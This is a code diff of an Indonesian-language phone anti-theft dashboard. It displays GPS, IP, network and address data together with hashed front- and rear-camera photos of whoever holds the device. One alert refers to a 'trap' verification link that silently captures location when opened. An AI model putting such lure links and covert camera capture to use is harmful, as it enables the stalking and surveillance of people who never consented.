+                ${telemetry.photoSha256 ? `<div style="font-size: 8px; color: #334155; font-family: monospace; word-break: break-all; margin-top: 5px; background: #f8fafc; padding: 4px; border: 1px dashed #cbd5e1; border-radius: 4px; text-align: left;"><strong>Integritas Bukti (SHA-256):</strong><br>${telemetry.photoSha256}</div>` : ''}
+              </div>
+            `;
+          }
+          if (telemetry.environmentPhoto) {
+            html += `
+              <div style="border: 2px solid #0284c7; padding: 6px; border-radius: 8px; text-align: center; width: 240px; background: #fff;">
+                <img src="${telemetry.environmentPhoto}" style="width: 100%; height: 160px; object-fit: cover; border-radius: 6px; display: block;" alt="Foto Lingkungan Sekitar" />
+                <div style="font-size: 10px; font-weight: bold; margin-top: 5px; font-family: sans-serif; color: #0369a1;">2. Kamera Belakang: Area di Depan Pencuri</div>
+                <div style="font-size: 9px; color: #64748b; font-family: monospace;">${new Date(telemetry.timestamp).toLocaleTimeString('id-ID')}</div>
+                ${telemetry.environmentPhotoSha256 ? `<div style="font-size: 8px; color: #334155; font-family: monospace; word-break: break-all; margin-top: 5px; background: #f8fafc; padding: 4px; border: 1px dashed #cbd5e1; border-radius: 4px; text-align: left;"><strong>Integritas Bukti (SHA-256):</strong><br>${telemetry.environmentPhotoSha256}</div>` : ''}
+              </div>
+            `;
+          }
+          if (!telemetry.photo && !telemetry.environmentPhoto) {
+            html += `<div style="font-size: 11px; color: #64748b; font-family: sans-serif;">Belum ada foto bukti visual yang tersimpan pada sesi ini.</div>`;
+          }
+          html += '</div>';
+          photoBox.innerHTML = html;
+        }
+      }
+
+      const rowsBox = document.getElementById('repHistoricRows');
+      if (rowsBox) {
+        const histList = (Array.isArray(history) && history.length > 0) ? history : (telemetry ? [telemetry] : []);
+        if (histList.length === 0) {
+          rowsBox.innerHTML = `<tr><td colspan="5" style="text-align: center; padding: 8px; border: 1px solid #cbd5e1; color: #64748b;">Belum ada rekam jejak koordinat.</td></tr>`;
+        } else {
+          rowsBox.innerHTML = histList.slice(0, 20).map((h, idx) => `
+            <tr style="border-bottom: 1px solid #cbd5e1; ${idx % 2 === 1 ? 'background: #f8fafc;' : ''}">
+              <td style="padding: 4px 6px; border: 1px solid #cbd5e1; text-align: center;">${idx + 1}</td>
+              <td style="padding: 4px 6px; border: 1px solid #cbd5e1; font-family: monospace;">${new Date(h.timestamp).toLocaleString('id-ID', { dateStyle: 'short', timeStyle: 'medium' })}</td>
+              <td style="padding: 4px 6px; border: 1px solid #cbd5e1; font-family: monospace; font-weight: bold;">
+                <a href="https://www.google.com/maps?q=${h.lat},${h.lon}" target="_blank" style="color: #0284c7; text-decoration: none;">
+                  [${Number(h.lat).toFixed(6)}, ${Number(h.lon).toFixed(6)}]
+                </a>
+              </td>
+              <td style="padding: 4px 6px; border: 1px solid #cbd5e1; text-align: center;">± ${h.accuracy || 10} m</td>
+              <td style="padding: 4px 6px; border: 1px solid #cbd5e1;">${escapeHtml(h.alertType || 'Beacon')}</td>
+            </tr>
+          `).join('');
+        }
+      }
+    }
+
     function renderTelemetry(telemetry, alerts) {
       if (!telemetry) return;
+      sentinelLatestCache = telemetry;
+
       document.getElementById('valLat').textContent = Number(telemetry.lat).toFixed(6);
       document.getElementById('valLon').textContent = Number(telemetry.lon).toFixed(6);
       document.getElementById('gpsAccuracy').textContent = `± ${telemetry.accuracy || 5} m`;
-      document.getElementById('valBattery').textContent = `${telemetry.batteryLevel || '--'}% ${telemetry.isCharging ? '(⚡ Dicas)' : ''}`;
-      document.getElementById('valNetwork').textContent = telemetry.networkName || 'Seluler';
-      document.getElementById('valActivity').textContent = telemetry.activity || 'Stationary (Diam)';
-      document.getElementById('valSpeed').textContent = `${telemetry.speed ? Math.round(telemetry.speed * 3.6) : 0} km/h`;
+      
+      const batEl = document.getElementById('valBattery');
+      if (batEl) {
+        if (telemetry.batteryLevel !== null && telemetry.batteryLevel !== undefined) {
+          batEl.innerHTML = `${telemetry.batteryLevel}% ${telemetry.isCharging ? '<span style="color:#10b981; font-weight:800;">⚡ (Sedang Dicas)</span>' : '<span style="color:#94a3b8;">🔋 (Baterai)</span>'}`;
+        } else {
+          batEl.innerHTML = `<span style="color:#f59e0b; font-size:11px;">🔒 Dibatasi Sandbox Apple iOS</span>`;
+        }
+      }
+
+      const netEl = document.getElementById('valNetwork');
+      if (netEl) {
+        netEl.textContent = telemetry.networkName || (telemetry.isp ? `${telemetry.isp} (${telemetry.org || ''})` : 'Provider Seluler');
+      }
+
+      const netSpeedEl = document.getElementById('valNetSpeed');
+      if (netSpeedEl) {
+        let speedText = '';
+        if (telemetry.as) speedText += `${telemetry.as}`;
+        if (telemetry.ipLocation) speedText += ` • ${telemetry.ipLocation}`;
+        if (telemetry.downlink) speedText += ` (${telemetry.downlink} Mbps)`;
+        netSpeedEl.textContent = speedText || (telemetry.networkType || 'Internet Publik');
+      }
+
+      const actEl = document.getElementById('valActivity');
+      if (actEl) {
+        actEl.textContent = telemetry.activity || 'Diam / Stationary';
+        if (telemetry.activity && (telemetry.activity.includes('Bergerak') || telemetry.activity.includes('Kendaraan') || telemetry.activity.includes('Motor'))) {
+          actEl.style.color = '#38bdf8';
+        } else {
+          actEl.style.color = '#f8fafc';
+        }
+      }
+
+      document.getElementById('valSpeed').textContent = `${telemetry.speed || 0} km/h`;
+      
+      const ipEl = document.getElementById('valClientIp');
+      if (ipEl) {
+        let ipDisp = telemetry.clientIp ? `${telemetry.clientIp}` : '';
+        if (telemetry.ipLocation) ipDisp += ` (${telemetry.ipLocation})`;
+        if (telemetry.platform) ipDisp += ` [${telemetry.platform}]`;
+        ipEl.textContent = ipDisp || '--';
+      }
+
       document.getElementById('valTrigger').textContent = telemetry.alertType || 'Normal Beacon';
 
-      const mapsLink = `https://www.google.com/maps?q=${telemetry.lat},${telemetry.lon}`;
-      document.getElementById('btnGoogleMaps').href = mapsLink;
+      // DMS Coordinates
+      const dmsEl = document.getElementById('valDms');
+      if (dmsEl) {
+        dmsEl.textContent = `${toDMS(telemetry.lat, true)} ${toDMS(telemetry.lon, false)}`;
+      }
+
+      // Tombol Navigasi Cepat Multi-Aplikasi
+      const gmapsLink = `https://www.google.com/maps/dir/?api=1&destination=${telemetry.lat},${telemetry.lon}`;
+      const streetViewLink = `https://www.google.com/maps/@?api=1&map_action=pano&viewpoint=${telemetry.lat},${telemetry.lon}`;
+      const wazeLink = `https://waze.com/ul?ll=${telemetry.lat},${telemetry.lon}&navigate=yes`;
+      
+      const btnGmaps = document.getElementById('btnGoogleMaps');
+      if (btnGmaps) btnGmaps.href = gmapsLink;
+      const btnStreet = document.getElementById('btnStreetView');
+      if (btnStreet) btnStreet.href = streetViewLink;
+      const btnWaze = document.getElementById('btnWaze');
+      if (btnWaze) btnWaze.href = wazeLink;
 
       // Update Map
       updateMapPosition(telemetry.lat, telemetry.lon, telemetry.accuracy);
 
       // Alert state
       const alertCard = document.getElementById('alertBanner');
-      if (telemetry.alertType && (telemetry.alertType.includes('airplane') || telemetry.alertType.includes('trap'))) {
+      if (telemetry.alertType === 'finder_authorized_report') {
+        alertCard.className = 'alert-card';
+        alertCard.style.borderColor = '#10b981';
+        alertCard.style.background = 'rgba(16, 185, 129, 0.15)';
+        document.getElementById('alertIcon').textContent = '🤝';
+        document.getElementById('alertTitle').textContent = 'PENEMU BERNIAT MENGEMBALIKAN HP!';
+        document.getElementById('alertDesc').textContent = 'Penemu mengirimkan titik lokasi & nomor kontak. Cek Aktivitas Masuk!';
+        playChimeSound();
+      } else if (telemetry.alertType && (telemetry.alertType.includes('airplane') || telemetry.alertType.includes('trap'))) {
         alertCard.className = 'alert-card danger';
+        alertCard.style.borderColor = '';
+        alertCard.style.background = '';
         document.getElementById('alertIcon').textContent = '🚨';
-        document.getElementById('alertTitle').textContent = 'WASPADA: PENCURIAN TERDETEKSI!';
-        document.getElementById('alertDesc').textContent = 'Pencuri mencoba mengaktifkan Mode Pesawat! Lokasi seketika diamankan.';
+        document.getElementById('alertTitle').textContent = 'WASPADA: JEBAKAN TERPICU!';
+        document.getElementById('alertDesc').textContent = 'Perangkat membuka link verifikasi! Lokasi seketika diamankan.';
         triggerAlarmSound();
       } else if (telemetry.alertType && telemetry.alertType.includes('battery')) {
         alertCard.className = 'alert-card danger';
+        alertCard.style.borderColor = '';
+        alertCard.style.background = '';
         document.getElementById('alertIcon').textContent = '⚠️';
         document.getElementById('alertTitle').textContent = 'BATERAI KRITIS: POSISI TERAKHIR';
-        document.getElementById('alertDesc').textContent = 'Laporan darurat sebelum iPhone kehabisan daya.';
+        document.getElementById('alertDesc').textContent = 'Laporan darurat sebelum perangkat kehabisan daya.';
       } else {
         alertCard.className = 'alert-card';
+        alertCard.style.borderColor = '';
+        alertCard.style.background = '';
         document.getElementById('alertIcon').textContent = '🛡️';
         document.getElementById('alertTitle').textContent = 'SISTEM SENYAP AKTIF';
         document.getElementById('alertDesc').textContent = `Beacon diterima: ${new Date(telemetry.timestamp).toLocaleTimeString()}`;
       }
 
-      // Reverse geocoding alamat jika belum ada
-      if (telemetry.address) {
-        document.getElementById('valAddress').textContent = telemetry.address;
+      // Reverse geocoding alamat berjenjang via server proxy
+      if (telemetry.structuredAddress) {
+        populateAddressFields(telemetry.structuredAddress);
       } else {
         reverseGeocode(telemetry.lat, telemetry.lon);
       }
 
-      // Mugshot image
-      if (telemetry.photo) {
-        const mugshotBox = document.getElementById('mugshotBox');
-        mugshotBox.innerHTML = `
-          <div class="mugshot-badge">🚨 FOTO BUKTI</div>
-          <img src="${telemetry.photo}" class="mugshot-img" alt="Wajah Pencuri" />
-        `;
+      // Dual-Angle Visual Evidence (Kamera Depan & Kamera Belakang)
+      const mugshotBox = document.getElementById('mugshotBox');
+      if (mugshotBox) {
+        if (telemetry.photo) {
+          mugshotBox.innerHTML = `
+            <div class="mugshot-badge">🚨 WAJAH (DEPAN)</div>
+            <img src="${telemetry.photo}" class="mugshot-img" alt="Wajah Pemegang Perangkat" onclick="openPhotoViewer('${escapeJs(telemetry.photo)}', ${telemetry.timestamp || Date.now()}, 'Foto Wajah Pemegang (Kamera Depan)', '${escapeJs(telemetry.photoSha256 || '')}')" style="cursor: zoom-in;" title="Klik untuk memperbesar foto wajah" />
+          `;
+        } else {
+          mugshotBox.innerHTML = `<div class="mugshot-empty" style="font-size: 10px;">Belum ada foto wajah</div>`;
+        }
+      }
+
+      const envPhotoBox = document.getElementById('envPhotoBox');
+      if (envPhotoBox) {
+        if (telemetry.environmentPhoto) {
+          envPhotoBox.innerHTML = `
+            <div class="mugshot-badge" style="background: rgba(14, 165, 233, 0.9);">🔭 AREA DEPAN (BELAKANG)</div>
+            <img src="${telemetry.environmentPhoto}" class="mugshot-img" alt="Area di Depan Pencuri" onclick="openPhotoViewer('${escapeJs(telemetry.environmentPhoto)}', ${telemetry.timestamp || Date.now()}, 'Foto Area & Lingkungan Depan (Kamera Belakang)', '${escapeJs(telemetry.environmentPhotoSha256 || '')}')" style="cursor: zoom-in;" title="Klik untuk memperbesar foto area depan" />
+          `;
+        } else {
+          envPhotoBox.innerHTML = `<div class="mugshot-empty" style="font-size: 10px; color: #64748b;">Belum ada foto area/lingkungan</div>`;
+        }
       }
     }
 
+    function toDMS(deg, isLat) {
+      if (deg === undefined || deg === null || isNaN(deg)) return '--';
+      const dir = isLat ? (deg >= 0 ? 'N' : 'S') : (deg >= 0 ? 'E' : 'W');
+      const d = Math.abs(deg);
+      const degrees = Math.floor(d);
+      const minutesNotTruncated = (d - degrees) * 60;
+      const minutes = Math.floor(minutesNotTruncated);
+      const seconds = ((minutesNotTruncated - minutes) * 60).toFixed(2);
+      return `${degrees}°${minutes}'${seconds}"${dir}`;
+    }
+
+    function populateAddressFields(data) {
+      if (!data) return;
+      const addrEl = document.getElementById('valAddress');
+      if (addrEl && (data.displayName || data.display_name)) {
+        addrEl.textContent = data.displayName || data.display_name;
+      }
+
+      const hamletEl = document.getElementById('valHamlet');
+      if (hamletEl) hamletEl.textContent = data.hamlet || data.suburb || data.road || '--';
+
+      const villageEl = document.getElementById('valVillage');
+      if (villageEl) villageEl.textContent = data.village || '--';
+
+      const distEl = document.getElementById('valDistrict');
+      if (distEl) distEl.textContent = data.district || '--';
+
+      const regEl = document.getElementById('valRegency');
+      if (regEl) regEl.textContent = data.regency || '--';
+
+      const provEl = document.getElementById('valProvince');
+      if (provEl) provEl.textContent = data.province || '--';
+    }
+
     async function reverseGeocode(lat, lon) {
+      if (!lat || !lon) return;
       try {
-        const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`);
-        const json = await res.json();
-        if (json.display_name) {
-          document.getElementById('valAddress').textContent = json.display_name;
+        const res = await fetch(`/api/sentinel/geocode?lat=${lat}&lon=${lon}`);
+        const data = await res.json();
+        if (data && data.ok) {
+          populateAddressFields(data);
+        } else if (data && data.displayName) {
+          populateAddressFields(data);
         }
-      } catch(e) {}
+      } catch(e) {
+        console.warn('Geocoding error:', e);
+      }
+    }
+
+    function openPhotoViewer(url, timestamp, title, hash) {
+      const modal = document.getElementById('photoViewerModal');
+      const img = document.getElementById('photoViewerImg');
+      const titleElem = document.getElementById('photoViewerTitle');
+      const timeElem = document.getElementById('photoViewerTimestamp');
+      const downloadBtn = document.getElementById('btnDownloadPhoto');
+      const hashBox = document.getElementById('photoViewerHashBox');
+      const hashVal = document.getElementById('photoViewerHashVal');
+      if (!modal || !img) return;
+      img.src = url;
+      if (titleElem && title) titleElem.textContent = title;
+      if (timeElem) timeElem.textContent = timestamp ? `Waktu: ${new Date(timestamp).toLocaleString('id-ID')}` : 'Waktu: Baru saja';
+      if (downloadBtn) downloadBtn.href = url;
+      if (hashBox && hashVal) {
+        if (hash) {
+          hashVal.textContent = hash;
+          hashBox.style.display = 'block';
+        } else {
+          hashBox.style.display = 'none';
+        }
+      }
+      modal.style.display = 'flex';
+    }
+
+    function closePhotoViewer() {
+      const modal = document.getElementById('photoViewerModal');
+      if (modal) modal.style.display = 'none';
+    }
+
+    async function triggerRemoteChime() {
+      if (!confirm('Picu nada dering pencarian (Find-My Chime) di HP target sekarang?')) return;
+      try {
+        const res = await fetch('/api/sentinel/trigger_chime', { method: 'POST' });
+        const data = await res.json();
+        if (data.ok) {
+          alert('🔔 Sinyal dering pencarian berhasil dikirim ke perangkat target!');
+        } else {
+          alert('Gagal mengirim sinyal dering: ' + (data.error || 'Server error'));
+        }
+      } catch (err) {
+        alert('Terjadi kesalahan jaringan: ' + err.message);
+      }
     }
 
     function playChimeSound() {
@@ -1154,7 +1805,7 @@
             <code style="font-size: 13px; color: #34d399; font-weight: 700; word-break: break-all;">${escapeHtml(item.value)}</code>
             <button onclick="navigator.clipboard.writeText('${escapeJs(item.value)}'); alert('Data disalin ke clipboard!');" style="margin-left: 8px; padding: 4px 8px; border: none; background: rgba(255,255,255,0.1); color: #fff; font-size: 11px; font-weight: 600; border-radius: 4px; cursor: pointer;">Salin</button>
           </div>
-          ${item.photo ? `<div style="margin-top: 4px;"><img src="${item.photo}" style="width: 100%; max-height: 80px; object-fit: cover; border-radius: 6px;" /></div>` : ''}
+          ${item.photo ? `<div style="margin-top: 4px;"><img src="${item.photo}" onclick="openPhotoViewer('${escapeJs(item.photo)}', ${item.timestamp || 'Date.now()'})" style="width: 100%; max-height: 80px; object-fit: cover; border-radius: 6px; cursor: zoom-in;" title="Klik untuk memperbesar foto bukti" /></div>` : ''}
         </div>
       `).join('');
     }
